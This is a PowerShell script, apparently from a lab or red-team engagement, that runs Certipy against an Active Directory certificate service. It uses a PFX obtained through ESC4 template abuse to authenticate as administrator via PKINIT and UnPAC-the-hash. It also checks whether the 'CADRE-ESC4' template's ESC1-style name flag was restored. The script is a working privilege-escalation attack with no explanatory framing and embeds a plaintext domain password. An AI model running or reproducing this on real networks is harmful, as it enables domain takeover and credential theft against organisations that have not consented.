$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack
Get-Process certipy -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

Write-Output "===== ESC4 auth (PKINIT + UnPAC) ====="
cmd /c "del /q C:\Tools\cadre-attack\administrator.ccache" 2>$null
$p4 = Get-ChildItem C:\Tools\cadre-attack\*esc4*.pfx -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
Write-Output "esc4_pfx=$p4"
if ($p4) {
  & $certpy auth -pfx $p4 -dc-ip 192.168.77.10 -domain cadre.local 2>&1 | Select-Object -Last 12
  Write-Output "auth_rc=$LASTEXITCODE"
} else { Write-Output "NO_PFX" }

Write-Output "===== CADRE-ESC4 current name flag (restore check) ====="
& $certpy template -template CADRE-ESC4 -u "chief_command@cadre.local" -p "C0mm@nd_Ch1ef!" -dc-ip 192.168.77.10 -save-configuration C:\Tools\cadre-attack\esc4-check.json 2>&1 | Select-Object -Last 4
$jf = Get-ChildItem C:\Tools\cadre-attack\*esc4-check*.json -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
if ($jf) {
  $j = Get-Content $jf -Raw | ConvertFrom-Json
  Write-Output "NAME_FLAG=$($j.'msPKI-Certificate-Name-Flag')  (1=EnrolleeSuppliesSubject/ESC1, 0=restored)"
  Write-Output "EKU=$($j.'pKIExtendedKeyUsage')"
} else { Write-Output "NO_CHECK_JSON" }
Write-Output "===== DONE ====="
